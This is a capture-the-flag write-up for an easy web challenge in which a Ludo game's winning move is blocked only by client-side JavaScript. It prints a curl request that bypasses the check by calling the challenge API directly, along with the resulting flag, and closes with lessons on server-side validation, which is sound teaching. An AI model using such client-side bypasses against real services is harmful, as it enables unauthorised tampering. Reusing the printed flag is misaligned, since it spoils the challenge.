# The Forbidden Six

**Challenge author:** Arylide
**Category:** Web
**Difficulty:** Easy
**Challenge URL:** [https://ludo-the-forbidden-six.onrender.com/](https://ludo-the-forbidden-six.onrender.com/)

## Description

The game starts with three red tokens already home. The fourth red token is at position `44`, the finish line is at position `50`, and the dice is fixed at `6`.

A winning move is therefore available, but the interface displays:

> Winning moves are disabled.

The objective is to determine who is enforcing this restriction and whether that component has any real authority.

## Initial Reconnaissance

Opening the page reveals the following relevant state:

```
Dice: 6
Turn: RED
Token #4: position 44
Status: Winning moves are disabled.
```

The page loads a client-side JavaScript file named `app.js`. Inspecting the HTML also reveals a comment indicating that the application uses the `/api/move` endpoint.

The API exposes the current game state through `/api/state`:

```json
{
  "ok": true,
  "state": {
    "turn": "red",
    "dice": 6,
    "winner": null,
    "tokens": {
      "1": { "position": 50, "finished": true },
      "2": { "position": 50, "finished": true },
      "3": { "position": 50, "finished": true },
      "4": { "position": 44, "finished": false }
    }
  }
}
```

This confirms that moving token `4` by `6` is the intended winning move.

## Client-Side Analysis

The client calculates the result of a move in `simulateMove( )`:

```
function simulateMove(move) {
  const token = state.tokens[move.token];
  if (!token || token.finished) {
    return { legal: false };
  }

  const newPosition = token.position + move.dice;
  if (newPosition > PATH_LENGTH) {
    return { legal: false };
  }

  return {
    legal: true,
    newPosition,
    winner: newPosition === PATH_LENGTH ? "red" : null,
  };
}
```

The important restriction is implemented in `validateMove()`:

```
function validateMove(move) {
  const simulated = simulateMove(move);

  if (!simulated.legal) {
    logLine("Move rejected locally: illegal move.", "line-err");
    return false;
  }

  if (simulated.winner) {
    showSystemNotice("Winning moves are disabled.");
    return false;
  }

  return true;
}
```

If the simulated move produces a winner, the function returns `false` before the request is sent. This is why clicking the button does not work.

However, this is only a browser-side check. It is not an authorization mechanism because the server endpoint can still be called directly.

## Finding the API Request

The client sends moves to `/api/move` using a JSON `POST` request:

```
async function sendMove(move) {
  const res = await fetch("/api/move", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(move),
  });

  return res.json();
}
```

The request body for the winning move is straightforward:

```json
{
  "token": 4,
  "dice": 6
}
```

## Exploit

The client-side validation can be bypassed by sending the request directly to the API.

```bash
curl -X POST https://ludo-the-forbidden-six.onrender.com/api/move \\
  -H 'Content-Type: application/json' \\
  --data '{"token":4,"dice":6}'
```

The server accepts the move and returns:

```json
{
  "ok": true,
  "winner": "red",
  "state": {
    "turn": "red",
    "dice": 6,
    "winner": "red",
    "tokens": {
      "1": { "position": 50, "finished": true },
      "2": { "position": 50, "finished": true },
      "3": { "position": 50, "finished": true },
      "4": { "position": 50, "finished": true }
    }
  },
  "flag": "NullOrigin{tH3_c1ient_siD3_spe4ks_th3_TrUth}"
}
```

## Flag

```
NullOrigin{tH3_c1ient_siD3_spe4ks_th3_TrUth}
```

## Root Cause

The restriction is enforced by the browser through the `validateMove( )` function. The server does not enforce the same restriction and accepts the winning move when the endpoint is called directly.

The client has no authority over the game result. It only controls the normal user interface. A user can bypass any client-side rule by modifying the page, calling the API manually, or replaying the request with a tool such as `curl` or Burp Suite.

The challenge's title and flag point to the same lesson: **the client-side code is telling the truth about the rule it applies, but that rule has no security authority.**

## Lessons Learned

Client-side validation is useful for user experience, but it must never be treated as a security boundary. Any important game rule must be checked on the server before the state is changed.

In this challenge, the server should have rejected a winning move if winning moves were genuinely forbidden. The API should independently validate the token state, dice value, turn, movement distance, and win condition. Only the server should be trusted to decide whether the move is allowed.

## References

[1]: https://ludo-the-forbidden-six.onrender.com/ "The Forbidden Six challenge instance"
